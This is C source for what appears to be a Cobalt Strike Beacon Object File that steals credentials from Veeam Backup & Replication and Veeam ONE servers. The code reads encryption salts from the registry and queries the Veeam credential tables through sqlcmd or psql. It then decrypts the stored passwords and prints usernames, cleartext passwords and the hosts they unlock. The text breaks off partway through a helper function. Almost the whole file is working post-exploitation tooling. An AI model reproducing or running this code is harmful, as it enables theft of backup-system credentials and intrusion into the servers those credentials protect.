#include <windows.h> 
#include "beacon.h"
#include "defs.h"
#include <string.h>
#include <winreg.h>
#include <stdlib.h>
#include <wincrypt.h>
#include <ctype.h>

// Other variables
#define MAX_SALT_LEN 512
#define MAX_INSTANCE_LEN 512
#define MAX_DB_NAME_LEN 512
#define MAX_BUF_LEN 8192
unsigned char salt[MAX_SALT_LEN];
int salt_length;
formatp buffer;
formatp credentials_buffer;
formatp host_creds_buffer;
int debug;
int VeeamOne;
char * db_type;
char * db_name; 
char * exe_path;

char * mssql_query = "SELECT user_name,password,description FROM [dbo].[Credentials];";
char * mssql_veeamOne_query = "SELECT username,password,description FROM [monitor].[Credentials];";
char *  psql_query = "SELECT user_name,password,description FROM credentials;";

// Credential to hosts mapping queries
// # VeeamOne:
// char * mssql_VeeamOne_hosts_query = "SET NOCOUNT ON;SELECT t1.username,STRING_AGG(DISTINCT t3.host_name, ', ') as hosts FROM [monitor].[Credentials] AS t1 INNER JOIN [monitor].[CredentialsLink] AS t2 ON t1.id = t2.cred_id INNER JOIN [monitor].[Entity] AS t3 ON t2.entity_id = t3.host_id GROUP BY t1.username ORDER BY t1.username;";
char* mssql_VeeamOne_hosts_query = "SELECT d.username, STRING_AGG(d.host_name, ', ') AS hosts FROM (SELECT DISTINCT t1.username, t3.host_name FROM [monitor].[Credentials] AS t1 INNER JOIN [monitor].[CredentialsLink] AS t2 ON t1.id = t2.cred_id INNER JOIN [monitor].[Entity] AS t3 ON t2.entity_id = t3.host_id) AS d GROUP BY d.username ORDER BY d.username;";
// # VBR MSSQL:
char * mssql_hosts_query = "SELECT t1.user_name,STRING_AGG(t2.name, ', ') as hosts FROM [dbo].[Credentials] AS t1 INNER JOIN [dbo].[EPContainers] AS t2 ON t1.id = t2.creds_id GROUP BY t1.user_name ORDER BY t1.user_name;";
// # VBR PSQL:
// char *  psql_hosts_query = "SELECT t1.user_name,STRING_AGG(t2.name, ', ') as hosts FROM credentials AS t1 INNER JOIN EPContainers AS t2 ON t1.id = t2.creds_id GROUP BY t1.user_name ORDER BY t1.user_name;";
char *  psql_hosts_query = "SELECT t1.user_name, STRING_AGG(DISTINCT t2.name, ', ') AS hosts FROM credentials AS t1 INNER JOIN EPContainers AS t2 ON t1.id = t2.creds_id GROUP BY t1.user_name ORDER BY t1.user_name;";


// Function Defs:
void GetVeeamSalt(int*, unsigned char* );
void PrintAndClear();
char* getExeFromPath(char *);
char* RunDBQueryPSQL(char*, char* ,int*);
char* RunDBQueryMSSQL(char*, char* ,int*);
void GetMSSQLInstance(int *,unsigned char * );
char* runCommand(char *,int *);
void DecryptLine(char*,int);
char* DecryptV(char*);
char* DecryptA(char*);
void getDBFromRegistry(char*);
void mapCredentials();
char* figureOutDbType();

void go(char * args, int alen) {
    // Exprected args <dbtype> <db name> <exe path> <debug> <veeamone>
    // BeaconPrintf(CALLBACK_OUTPUT, "Running Veeam Creds with args: %s (%d)", args,alen);

    BeaconFormatAlloc(&buffer,MAX_BUF_LEN);
    BeaconFormatAlloc(&credentials_buffer,MAX_BUF_LEN);
    BeaconFormatAlloc(&host_creds_buffer,MAX_BUF_LEN);

    BeaconFormatPrintf(&credentials_buffer, "======================\n");
    BeaconFormatPrintf(&credentials_buffer, "Credentials:\n");
    BeaconFormatPrintf(&credentials_buffer, "======================\n");
    
 

    if (alen < 1) {
        BeaconPrintf(CALLBACK_ERROR,"[-] at least one argument is required\n");
        return;
    }

    datap  parser;


    
    int db_name_size;
    
    BeaconDataParse(&parser, args, alen);
    db_type = BeaconDataExtract(&parser, NULL);
    db_name = BeaconDataExtract(&parser, &db_name_size);
    exe_path = BeaconDataExtract(&parser, NULL);
    debug = BeaconDataInt(&parser);
    VeeamOne = BeaconDataInt(&parser);


    // BeaconPrintf(CALLBACK_OUTPUT, "[INFO] db_type: %s  ", db_type);
    if (strcmp(db_type, "auto") == 0 ) {
        db_type =figureOutDbType();
        if(db_type == NULL){
            BeaconPrintf(CALLBACK_ERROR,"Could not figure out the DB type from registry %s\n",db_type);
            return;
        }
    }

    if (strcmp(db_type, "mssql") == 0 ) {
        // BeaconPrintf(CALLBACK_OUTPUT, "DB set to MSSQL");
        
        BeaconFormatPrintf(&buffer, "[INFO] DB set to MSSQL\n");
        
    }
    else if (strcmp(db_type, "psql") == 0){
        // BeaconPrintf(CALLBACK_OUTPUT, "DB set to PSQL");
        BeaconFormatPrintf(&buffer, "[INFO] DB set to PSQL\n");
        // BeaconPrintf(CALLBACK_OUTPUT, "[INFO] db_type: %s  ", db_type);

    }
    else{
        PrintAndClear();
        BeaconPrintf(CALLBACK_ERROR,"First argument must be 'mssql' or 'psql', got %s\n",db_type);
        return;
    }
    
    // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] DB Set");

    if (debug)
        BeaconFormatPrintf(&buffer, "[INFO] Debug mode is on\n");
    else       
        BeaconFormatPrintf(&buffer, "[INFO] Debug mode is off\n");

    // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] Getting Exe Path");

    if (strcmp(exe_path, "") == 0 ){
        // BeaconPrintf(CALLBACK_OUTPUT, "[Testing] searching for exe for  %s", db_type);
        exe_path =  getExeFromPath(db_type);

        // BeaconPrintf(CALLBACK_OUTPUT, "Found file: %s", exe_path);
        if(exe_path != NULL){
            if (strcmp(exe_path, "") != 0 ){
                BeaconFormatPrintf(&buffer, "[INFO] Found exe: %s\n", exe_path);
                // PrintAndClear();
            }
            else{
                PrintAndClear();
                BeaconPrintf(CALLBACK_ERROR,"Could not find exe for db %s",db_type);
                return;
            }
        }
        else{
                PrintAndClear();
                BeaconPrintf(CALLBACK_ERROR,"Could not find exe for db %s",db_type);
                return;
        }
    }else {
        // Check if provided path exists
        DWORD attrs = GetFileAttributesA(exe_path);
        if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            BeaconFormatPrintf(&buffer, "[INFO] Exe path set to: %s\n", exe_path);
            // PrintAndClear();
        }else{
            PrintAndClear();
            BeaconPrintf(CALLBACK_ERROR,"Specified path not found! %s",exe_path);
            return;
        }

    }

    
    if (strcmp(db_name, "") == 0 ){
        db_name = (char *)malloc(MAX_DB_NAME_LEN);
        getDBFromRegistry(db_name);
        // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] Got DB: %s",db_name);
        if (db_name != NULL){
            if (strcmp(db_name, "") == 0){
                PrintAndClear();
                BeaconPrintf(CALLBACK_ERROR,"Failed to get DB name from registry. Try specifying with --dbname or double check if this is VeeamOne or Backup and Replication\n");
                return;
            }
            else{
                BeaconFormatPrintf(&buffer, "[INFO] Got DB from registry: %s\n",db_name);
            }
        }else{
            return;
        }
    }



    // PrintAndClear();
    // PrintAndClear();
    // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] Getting Salt");

    GetVeeamSalt(&salt_length,salt);
    if (salt_length >0){
        if (VeeamOne){
            BeaconFormatPrintf(&buffer, "[INFO] Veeam Entropy: ");
            for (int i = 0; i < salt_length; i++)
            {
                BeaconFormatPrintf(&buffer, "%02X", salt[i]);
            }
            BeaconFormatPrintf(&buffer, "\n");
        }else{
            BeaconFormatPrintf(&buffer, "[INFO] Veeam EncryptionSalt: %s\n",salt);
        }
       
    }
    else{
        PrintAndClear();
        
        BeaconFormatPrintf(&buffer, "[WARN] Salt has 0 length. This will still work for A-type encryption if it is not VeeamOne. \n");
        // BeaconPrintf(CALLBACK_ERROR,"Salt has 0 length");
        // return;
    }
    // PrintAndClear();


    int sql_output_length;
    char* sql_output = NULL;
    if (strcmp(db_type, "mssql") == 0 ) {
        sql_output = RunDBQueryMSSQL(exe_path,db_name,&sql_output_length);
        // PrintAndClear();
        
    }
    else if (strcmp(db_type, "psql") == 0){
        sql_output = RunDBQueryPSQL(exe_path,db_name,&sql_output_length);
    }
    // PrintAndClear();
    // return;
    
  


    if(debug && (sql_output != NULL))
        BeaconFormatPrintf(&buffer, "[DEBUG] SQL Output:\n----------------------\n%s",sql_output);
    else if (debug && (sql_output == NULL))
        BeaconFormatPrintf(&buffer, "[DEBUG] SQL Output is NULL!");
   
    PrintAndClear();
   

    // Take the SQL output and process line by line
    // Ignore lines that have "rows)" and "user_name:password:description"
    if (sql_output != NULL){
        char *line_start = sql_output;
        while (*line_start) {
            char *line_end = line_start;
            while (*line_end && *line_end != '\n') line_end++;
            
            // Create a new substring and pass this to DecryptLine
            int len = line_end - line_start;
            char *line_copy = (char *)malloc(len + 1);  
            if (!line_copy) break;  
            memcpy(line_copy, line_start, len);
            line_copy[len] = '\0'; 
            
            char *exclude1 = "user_name:password:description";
            char *exclude2 = "rows)";
            char *exclude3 = "rows affected)"; 
            char * include = ":";


            
            
            if(!(strstr(line_copy, exclude1) || strstr(line_copy, exclude2)|| strstr(line_copy, exclude3))){
                if(strstr(line_copy, include))
                    DecryptLine(line_copy, len);
                else{
                    if(debug)
                      BeaconFormatPrintf(&buffer, "[DEBUG] Ignoring Line: %s\n",line_copy);
   
                }
            }

            if (*line_end == '\n') line_start = line_end + 1;
            else break;
        }
    }
   
    PrintAndClear();
    // return;
    mapCredentials();
    BeaconFormatFree(&buffer);
    int lentemp = 0;
    char* outtemp = BeaconFormatToString(&credentials_buffer, &lentemp);

    if (lentemp > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "%.*s\n", lentemp, outtemp);
        BeaconFormatReset(&credentials_buffer);
        BeaconFormatFree(&credentials_buffer);
        // BeaconFormatAlloc(&buffer,MAX_BUF_LEN);
    } 

    outtemp = BeaconFormatToString(&host_creds_buffer, &lentemp);

    if (lentemp > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "%.*s\n", lentemp, outtemp);
        BeaconFormatReset(&host_creds_buffer);
        BeaconFormatFree(&host_creds_buffer);
        BeaconFormatAlloc(&host_creds_buffer,MAX_BUF_LEN);
    } 
    // BeaconPrintf(CALLBACK_OUTPUT,"%s",BeaconFormatToString(&credentials_buffer,NULL));
    // BeaconFormatFree(&credentials_buffer);
    // PrintAndClear();
    // return;
    // BeaconPrintf(CALLBACK_OUTPUT,"%s",BeaconFormatToString(&host_creds_buffer,NULL));
    // BeaconFormatFree(&host_creds_buffer);
    

    
}

char* figureOutDbType(){

    // If reg key Veeam One exists, then this will be mssql

    // else check registry for VBR
    // Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations
    // SqlActiveConfiguration = PostgreSql

    HKEY hKey = NULL;
    DWORD dwType = 0;
    DWORD cbData = 0;

    char * regDBPathVBR = "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations";
    char * regKeyVBR = "SqlActiveConfiguration";
    char * regDBPathVeeamOne = "SOFTWARE\\Veeam\\Veeam One";
    char * reg_result;
    char * local_db_type;
    char * db_type_out;
    // bool isVeeamOne = 0;
    // bool isVBR = 0;

    // Check if VBR path exists
    LONG status = RegOpenKeyExA( HKEY_LOCAL_MACHINE, regDBPathVBR,0, KEY_READ | KEY_WOW64_64KEY, &hKey);
    if (status == ERROR_SUCCESS)
    {
        if(debug)
            BeaconFormatPrintf(&buffer, "[DEBUG] Found Backup and Replication, checking registry for DB type\n");

        
        BeaconFormatPrintf(&buffer, "[INFO] Found Veeam Backup and Replication\n");        
        status = RegQueryValueExA(hKey,regKeyVBR,NULL,&dwType,NULL,&cbData );
        if (status != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR,"RegQueryValueExA (size query) failed: %ld\n", status);
            RegCloseKey(hKey);
            return NULL;
        }

        if (dwType != REG_SZ && dwType != REG_EXPAND_SZ) {
            BeaconPrintf(CALLBACK_ERROR,"Unexpected registry type: %lu\n", dwType);
            RegCloseKey(hKey);
            return NULL;
        }

        // // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] Got reg size %d",cbData);
        local_db_type = (char*)malloc(cbData +1);
        status = RegQueryValueExA(hKey,regKeyVBR,NULL,&dwType,(LPBYTE)local_db_type,&cbData);   
        

        if (status != ERROR_SUCCESS || hKey == NULL)
        {
            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read %s or wrong type 0x%lx\n", regKeyVBR,status);
            RegCloseKey(hKey);
            return NULL;
        }
        // local_db_type[cbData] = '\0';
        if (strcmp(local_db_type,"PostgreSql") == 0){
            db_type_out= (char*)malloc(5);
            strcpy(db_type_out,"psql");
        }
        else if (strcmp(local_db_type,"MsSql") == 0){
            db_type_out= (char*)malloc(6);
            strcpy(db_type_out,"mssql");
        }
        else{
            BeaconPrintf(CALLBACK_ERROR,"[!] Got unkown value from registry %s\n", local_db_type);
            // strcpy(db_type_out,"");
            return NULL;
        }
        if(debug)
            BeaconFormatPrintf(&buffer, "[DEBUG] Found Backup and Replication DB type: %s\n",db_type_out);
        return db_type_out;
    }

    // Check for Veeam One - if key exists then set to mssql
    status = RegOpenKeyExA( HKEY_LOCAL_MACHINE, regDBPathVeeamOne,0, KEY_READ | KEY_WOW64_64KEY, &hKey);
    if (status == ERROR_SUCCESS)
    {
            BeaconFormatPrintf(&buffer, "[INFO] Found Veeam One\n"); 
            db_type_out= (char*)malloc(6);
            strcpy(db_type_out,"mssql");
            VeeamOne =1;
            return db_type_out; 

    }
    return NULL;

}
void getDBFromRegistry(char* db_name){

    HKEY hKey = NULL;
    DWORD dwType = 0;
    DWORD cbData = 0;

    char * regPath;
    char * regKey;
    char * reg_result;

    if (VeeamOne){
        regPath = "SOFTWARE\\Veeam\\Veeam ONE";
        regKey = "DatabaseName";
    }else if (strcmp(db_type, "mssql") == 0 ){
        regPath = "SOFTWARE\\VEEAM\\Veeam Backup and Replication\\DatabaseConfigurations\\Mssql";
        regKey = "SqlDatabaseName";
    }else if (strcmp(db_type, "psql") == 0 ){
        regPath = "SOFTWARE\\VEEAM\\Veeam Backup and Replication\\DatabaseConfigurations\\PostgreSql";
        regKey = "SqlDatabaseName";
    }

    LONG status = RegOpenKeyExA( HKEY_LOCAL_MACHINE, regPath,0, KEY_READ | KEY_WOW64_64KEY, &hKey);


    // return;

    if (status != ERROR_SUCCESS || hKey == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR,"Failed to open registry path %s Error: 0x%lx\n", regPath,status);
        strcpy(db_name,"");
        return;
    }

    // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] RegOpenKeyExA success");


    //get length
    status = RegQueryValueExA(hKey,regKey,NULL,&dwType,NULL,&cbData );
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,"RegQueryValueExA (size query) failed: %ld\n", status);
        RegCloseKey(hKey);
        strcpy(db_name,"");
        return ;
    }

    if (dwType != REG_SZ && dwType != REG_EXPAND_SZ) {
        BeaconPrintf(CALLBACK_ERROR,"Unexpected registry type: %lu\n", dwType);
        RegCloseKey(hKey);
        strcpy(db_name,"");
        return;
    }

    // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] Got reg size %d",cbData);
    status = RegQueryValueExA(hKey,regKey,NULL,&dwType,(LPBYTE)db_name,&cbData);   
    

    if (status != ERROR_SUCCESS || hKey == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read %s or wrong type 0x%lx\n", regKey,status);
        RegCloseKey(hKey);
        strcpy(db_name,"");
        return;
    }
    db_name[cbData] = '\0';
    // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] Reg REsult %s",db_name);

    // db_name = malloc(cbData +1);
    // strcpy(db_name, reg_result); 
    
    // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] DB Name worked %s",db_name);
    // return;

    RegCloseKey(hKey);

}
// Print and clear buffer
void PrintAndClear(){
    int len = 0;
    char* out = BeaconFormatToString(&buffer, &len);

    if (len > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "%.*s\n", len, out);
        BeaconFormatReset(&buffer);
        BeaconFormatFree(&buffer);
        BeaconFormatAlloc(&buffer,MAX_BUF_LEN);
    }  
}

// void PrintAndClearCredsBuffer(){
//     int len = 0;
//     char* out = BeaconFormatToString(&buffer, &len);

//     if (len > 0) {
//         BeaconPrintf(CALLBACK_OUTPUT, "%.*s\n", len, out);
//         BeaconFormatReset(&credentials_buffer);
//         BeaconFormatFree(&credentials_buffer);
//         BeaconFormatAlloc(&credentials_buffer,MAX_BUF_LEN);
//     }  
// }

// If not path was specified this function will search the user's $PATH
char* getExeFromPath(char * db_type){
    
    char *filename;
    const char fullPath[MAX_PATH];
    char *filePart = NULL;
    
    // BeaconPrintf(CALLBACK_OUTPUT, "[Testing] getExeFromPath: %s",db_type);
    

    if (debug){
        // BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Searching for exe for %s in PATH",db_type);
        BeaconFormatPrintf(&buffer, "[DEBUG] Searching for exe for %s in PATH\n",db_type);
    }
    // PrintAndClear()
    if (strcmp(db_type, "mssql") == 0 ) {
        filename = "sqlcmd.exe";
    }
    else if (strcmp(db_type, "psql") == 0){
        filename = "psql.exe";
    }
    // BeaconPrintf(CALLBACK_OUTPUT, "[Testing] getExeFromPath file set to: %s",filename);
   
    DWORD result = SearchPathA(NULL, filename,  NULL, MAX_PATH, fullPath, &filePart);
    const char *found = NULL;

    // BeaconPrintf(CALLBACK_OUTPUT, "[Testing] SearchPathA result %d,%s",result,fullPath);

    if (result == 0) {
        // BeaconPrintf(CALLBACK_OUTPUT, "[Testing] In result = 0");
        if (debug){
            // BeaconPrintf(CALLBACK_OUTPUT, "%s not found in PATH... searching common locations",filename);
            BeaconFormatPrintf(&buffer, "[DEBUG] %s not found in PATH... searching common locations\n",filename);
        }

        if (strcmp(db_type, "mssql") == 0 ) {
            const char * paths[] = {
                    "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\sqlcmd.exe",
                    "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\180\\Tools\\Binn\\sqlcmd.exe",
                    "C:\\Program Files\\Microsoft SQL Server\\110\\Tools\\Binn\\sqlcmd.exe",
                    "C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn\\sqlcmd.exe",
                    "C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlcmd.exe",
                    "C:\\Program Files\\Microsoft SQL Server\\140\\Tools\\Binn\\sqlcmd.exe",
                    "C:\\Program Files\\Microsoft SQL Server\\150\\Tools\\Binn\\sqlcmd.exe",
                    "C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\sqlcmd.exe",
                    "C:\\Program Files (x86)\\Microsoft SQL Server\\140\\Tools\\Binn\\sqlcmd.exe",
            };

            for (int i = 0; i < (sizeof(paths) / sizeof(paths[0])); i++) {
                DWORD attrs = GetFileAttributesA(paths[i]);

                if (attrs != INVALID_FILE_ATTRIBUTES &&
                    !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
                    found = paths[i];
                    break;
                }
            }

            if (found && debug) {
                // BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Found file: %s", found);
                BeaconFormatPrintf(&buffer, "[DEBUG] Found file: %s\n", found);
            } else if (!found){
                // PrintAndClear();
                BeaconPrintf(CALLBACK_ERROR, "No valid path found");
                return NULL;
            }
        }
        else if (strcmp(db_type, "psql") == 0){
            const char * paths[] = {
                "C:\\Program Files\\PostgreSQL\\17\\bin\\psql.exe",
                "C:\\Program Files\\PostgreSQL\\16\\bin\\psql.exe",
                "C:\\Program Files\\PostgreSQL\\15\\bin\\psql.exe",
                "C:\\Program Files\\PostgreSQL\\14\\bin\\psql.exe",
                "C:\\Program Files\\PostgreSQL\\13\\bin\\psql.exe"
                "C:\\Program Files (x86)\\PostgreSQL\\13\\bin\\psql.exe",
                "C:\\PostgreSQL\\bin\\psql.exe"
            };

            

            for (int i = 0; i < (sizeof(paths) / sizeof(paths[0])); i++) {
                
                DWORD attrs = GetFileAttributesA(paths[i]);
                
                if (attrs != INVALID_FILE_ATTRIBUTES &&
                    !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
                    found = paths[i];
                    break;
                }
            }

            if (found) {
                // BeaconPrintf(CALLBACK_OUTPUT, "Found file: %s", found);
               return found;
            } else {
                // PrintAndClear();
                PrintAndClear();
                BeaconPrintf(CALLBACK_ERROR, "No exe path found for %s",db_type);
                return NULL;
            }
        }
   
        // BeaconPrintf(CALLBACK_OUTPUT, "Returning fullpath");
        return fullPath;
    }
    else{
        // result points to the length of the file path
         char *final_path = (char *)malloc(result+1);
        // found = fullPath;
        // BeaconPrintf(CALLBACK_OUTPUT, "[Testing] Found in $PATH: %s",fullPath);
        strcpy(final_path, fullPath); 
        // exe_path = fullPath;
        return final_path;
    }
    
}

void GetVeeamSalt(int *out_len, unsigned char* out_salt )
{
    HKEY hKey = NULL;
    DWORD dwType = 0;
    DWORD cbData = MAX_SALT_LEN;
    // unsigned char salt[MAX_SALT_LEN];

    char * regPath;
    char * regKey;

    if (VeeamOne){
        regPath = "SOFTWARE\\Veeam\\Veeam ONE\\Private";
        regKey = "Entropy";
    }else{
        regPath = "SOFTWARE\\Veeam\\Veeam Backup and Replication\\Data";
        regKey = "EncryptionSalt";
    }

    LONG status = RegOpenKeyExA( HKEY_LOCAL_MACHINE, regPath,0, KEY_READ | KEY_WOW64_64KEY, &hKey);

    if (status != ERROR_SUCCESS || hKey == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open registry path %s Error: 0x%lx\n", regPath,status);
        *out_len = 0;
        return;
    }

    //  BeaconPrintf(CALLBACK_OUTPUT,"About to read  %s ", regKey);
    status = RegQueryValueExA(hKey,regKey,NULL,&dwType,out_salt,&cbData);   

    if (status != ERROR_SUCCESS || hKey == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read %s or wrong type 0x%lx\n", regKey,status);
        RegCloseKey(hKey);
        *out_len = 0;
        return;
    }
    // out_salt[cbData] = '\0';
    // BeaconPrintf(CALLBACK_OUTPUT, "Got Key: %s", out_salt);
    RegCloseKey(hKey);
    *out_len = (int)cbData;
    // out_salt = salt;
}

char* RunDBQueryPSQL(char * db_path,char* db_name,int* out_len){

    char *output = NULL;
    int total_len = 0;
    char cmdLine[2048];

    // snprintf(cmdLine, sizeof(cmdLine), "\"%s\"  -U postgres -A -F : -c \"%s\"", db_path, psql_query);
    strcpy(cmdLine, "\"");
    strcat(cmdLine, db_path);
    strcat(cmdLine, "\" -d "); 
    strcat(cmdLine, db_name); 
    strcat(cmdLine, " -U postgres -A -F : -c \"");
    strcat(cmdLine, psql_query);
    strcat(cmdLine, "\"");
    if (debug)
        BeaconFormatPrintf(&buffer, "[DEBUG] Command: %s\n",cmdLine);
      

    output = runCommand(cmdLine,&total_len);
    if(total_len >0){
        return output;
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "Process output returned 0 length!");
    }
}


void GetMSSQLInstance(int* out_len,unsigned char * out_instance_name){
    // BeaconPrintf(CALLBACK_OUTPUT,"Getting MSSQL Instance\n");
    HKEY hKey = NULL;
    DWORD dwType = 0;
    DWORD cbData = MAX_INSTANCE_LEN;
    // char* instancename[32]; // max length fo 16 chars

    // check if the key exists, if not return null
    // BeaconPrintf(CALLBACK_OUTPUT,"Getting mssql instance");
    char * regPath;
    char * regKey;

    if(VeeamOne){
        regPath = "SOFTWARE\\Veeam\\Veeam One";
        regKey ="DatabaseServer";
    }
    else{
        regPath = "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations\\mssql";
        regKey = "SQLInstanceName";
    }

    // BeaconPrintf(CALLBACK_OUTPUT,"path and ket set to %s, %s",regPath,regKey);
    // return ;

    
    LONG status = RegOpenKeyExA( HKEY_LOCAL_MACHINE, regPath,0, KEY_READ | KEY_WOW64_64KEY, &hKey);

    if (status != ERROR_SUCCESS || hKey == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open %s Error: 0x%lx\n",regPath ,status);
        *out_len = 0;
        out_instance_name = NULL;
        return;
    }
    // BeaconPrintf(CALLBACK_OUTPUT,"Finished open path");

    status = RegQueryValueExA(hKey,regKey,NULL,&dwType,out_instance_name,&cbData);

    if (status != ERROR_SUCCESS || hKey == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read %s or wrong type 0x%lx\n",regKey ,status);
        RegCloseKey(hKey);
        *out_len = 0;
        out_instance_name = NULL;
        return;
    }
    // BeaconPrintf(CALLBACK_OUTPUT,"Finished open key");
    // BeaconPrintf(CALLBACK_OUTPUT,"GetMSSQLInstance - instance: %s",out_instance_name);

    RegCloseKey(hKey);
    *out_len = (int)cbData;

}
char* RunDBQueryMSSQL(char * db_path,char* db_name,int* out_len){
    char * instance_name = (char *)malloc(MAX_INSTANCE_LEN);
    int  instance_length;

    GetMSSQLInstance(&instance_length,instance_name);

    char *output = NULL;
    int total_len = 0;
    char cmdLine[2048];

    // snprintf(cmdLine, sizeof(cmdLine), "\"%s\"  -U postgres -A -F : -c \"%s\"", db_path, psql_query);
    // Arguments = $"-S .\\{sqlInstance} -E -d {veeamDbName} -Q \"{query}\" -s\":\" -W -h -1",
    strcpy(cmdLine, "\"");
    strcat(cmdLine, db_path);
    if(VeeamOne)
        strcat(cmdLine, "\" -S "); 
    else
        strcat(cmdLine, "\" -S .\\"); 

    strcat(cmdLine, instance_name); 
    strcat(cmdLine, " -E -d ");
    strcat(cmdLine, db_name);
    strcat(cmdLine, " -s\":\" -y0 -Q \"");
    if(VeeamOne)
        strcat(cmdLine, mssql_veeamOne_query);
    else
        strcat(cmdLine, mssql_query);
    strcat(cmdLine, "\" ");
    if (debug)
        BeaconFormatPrintf(&buffer, "[DEBUG] Command: %s\n",cmdLine);
      
    
    output = runCommand(cmdLine,&total_len);
    if(total_len >0){
        return output;
    }
    else{
        PrintAndClear();
        BeaconPrintf(CALLBACK_ERROR, "Process output returned 0 length!");
    }


}
// Generic function that runs command, chunks the output
char* runCommand(char * cmdLine, int *out_len){

    // BeaconPrintf(CALLBACK_OUTPUT, "Running: %s", cmdLine);
    // return NULL;

    HANDLE hRead = NULL;
    HANDLE hWrite = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    char output_buffer[10];
    char *final_output = NULL;
    int total_len = 0;
    DWORD bytesRead;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)){
        PrintAndClear();
        BeaconPrintf(CALLBACK_ERROR, "Create CreatePipe failed!");
        return NULL;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;

    if (!CreateProcessA(NULL, (LPSTR)cmdLine, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        PrintAndClear();
        BeaconPrintf(CALLBACK_ERROR, "Create ProcessA failed!");
        return NULL;
    }

    CloseHandle(hWrite);

  
    while (ReadFile(hRead, output_buffer, sizeof(output_buffer), &bytesRead, NULL) && bytesRead > 0)
    {
        char *tmp = realloc(final_output, total_len + bytesRead + 1);
        if (!tmp) {  
            free(final_output);
            CloseHandle(hRead);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return NULL;
        }
        final_output = tmp;

        memcpy(final_output + total_len, output_buffer, bytesRead);
        total_len += bytesRead;
        // BeaconPrintf(CALLBACK_OUTPUT, "[HELP] Current output: %s", final_output);
        // final_output[total_len] = '\0';  
    }

    // while (ReadFile(hRead, output_buffer, sizeof(output_buffer)-1, &bytesRead, NULL) && bytesRead > 0)
    // {
    //     output_buffer[bytesRead] = 0;  // null-terminate
    //     BeaconFormatPrintf(&buffer, "%s", output_buffer);
    // }

    // BeaconFormatPrintf(&buffer, "%s", final_output);
    if (debug)
        BeaconFormatPrintf(&buffer, "[DEBUG] Final output lenght: %d\n",total_len);
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    *out_len =total_len;
    if(total_len <=0)
        return NULL;
    // BeaconPrintf(CALLBACK_OUTPUT, "Built buffer %s", final_output);
    char *final_output_local = (char *)malloc(total_len+1);

    // strcpy(final_output_local, final_output);
    memcpy(final_output_local, final_output, total_len);
    final_output_local[total_len] = '\0'; 
    return final_output_local;
}

void DecryptLine(char* line,int len){

    // BeaconPrintf(CALLBACK_OUTPUT, "Processing %s",line);
    // return;
    // Ignore if password field is empty
    char *first_colon = strchr(line, ':');
    char *second_colon = strchr(first_colon + 1, ':');
    if (second_colon == first_colon + 1) {
        if (debug)
            BeaconFormatPrintf(&buffer, "[DEBUG] Ignoring no password: %s\n", line);
        return;
    }else{
    // process this line
        if (debug)
            BeaconFormatPrintf(&buffer, "[DEBUG] Processing : %s\n", line);
        
        char *Username = line;
        char *EncPassword = NULL;
        char *Desc = NULL;

        if (!first_colon) return;
        *first_colon = '\0';      

        EncPassword = first_colon + 1;

        if (!second_colon) return; 
        *second_colon = '\0';      

        Desc = second_colon + 1;

        char* ClearText = NULL;
        if (EncPassword[0] =='A'){
            ClearText= DecryptA(EncPassword);
        }
        else if (EncPassword[0] =='V'){
            ClearText= DecryptV(EncPassword);

        }
        if (ClearText != NULL){
            // BeaconPrintf(CALLBACK_OUTPUT, "Username: %s\nPassword: %s\n",Username,ClearText);
            BeaconFormatPrintf(&credentials_buffer, "Username: %s\n", Username);
            BeaconFormatPrintf(&credentials_buffer, "Password: %s\n", ClearText);
            BeaconFormatPrintf(&credentials_buffer, "Desc: %s\n\n", Desc);
        }
    }
   

}

BOOL IsProbablyWideString(BYTE *data, DWORD len)
{
    // Guessing if its a wide string 
    // Length must be even. If most odd bytes are null then probably wide
